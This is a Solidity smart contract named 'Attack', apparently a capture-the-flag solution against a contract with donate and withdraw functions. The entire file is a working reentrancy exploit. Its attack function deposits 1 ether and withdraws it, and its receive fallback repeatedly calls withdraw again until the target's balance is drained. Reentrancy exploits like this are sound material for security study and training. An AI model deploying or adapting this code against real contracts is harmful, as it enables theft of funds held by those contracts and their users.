// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IReentrancy {
        function donate(address) external payable;
        function withdraw(uint256) external;
}

contract Attack {
    IReentrancy public immutable target;

    constructor(address addr) public{
        target = IReentrancy(addr);
    }

    function attack() external payable{
        target.donate{value: 1e18}(address(this));
        target.withdraw(1e18);
    }

    receive() external payable {
        uint amount = min(1e18, address(target).balance);
        if (amount > 0) {
            target.withdraw(amount);
        }
    }

    function min(uint x, uint y) public pure returns(uint) {
        return x >= y ? y : x;
    }
}